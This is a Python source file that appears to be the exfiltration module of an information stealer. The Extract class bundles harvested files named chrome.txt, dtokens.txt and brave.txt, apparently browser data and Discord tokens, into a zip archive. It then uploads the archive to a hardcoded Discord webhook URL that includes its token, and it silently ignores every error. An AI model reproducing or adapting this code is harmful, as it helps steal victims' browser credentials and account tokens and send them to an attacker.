from discord_webhook import DiscordWebhook
from zipfile import ZipFile
from constants import MY_HOME


class Extract(object):
    def __init__(self) -> None:
        self.webhook_url = "https://discord.com/api/webhooks/955574363447525407/3h9u4wOcxM3sHD_ZIjSO0jqlbtJt5yywDfljJRXASbFMczMqrlh3O8lhP_gtGYdjXlIS"
        self.zip_files()
        self.send_data(self.webhook_url)

    def zip_files(self):
        with ZipFile(MY_HOME + "extraction.zip", "w") as zip_obj:
            try:
                zip_obj.write(MY_HOME+'chrome.txt')
            except FileNotFoundError:
                pass
            try:
                zip_obj.write(MY_HOME+'dtokens.txt')
            except FileNotFoundError:
                pass
            try:
                zip_obj.write(MY_HOME+'brave.txt')
            except FileNotFoundError:
                pass

            zip_obj.close()

    def send_data(self, webhook_url):
        try:
            webhook = DiscordWebhook(
                url=webhook_url, username="webhook with files",  rate_limit_retry=True)
            with open(MY_HOME+"extraction.zip", "rb") as f:
                webhook.add_file(file=f.read(), filename="extraction.zip")
            resp = webhook.execute()
        except:
            pass
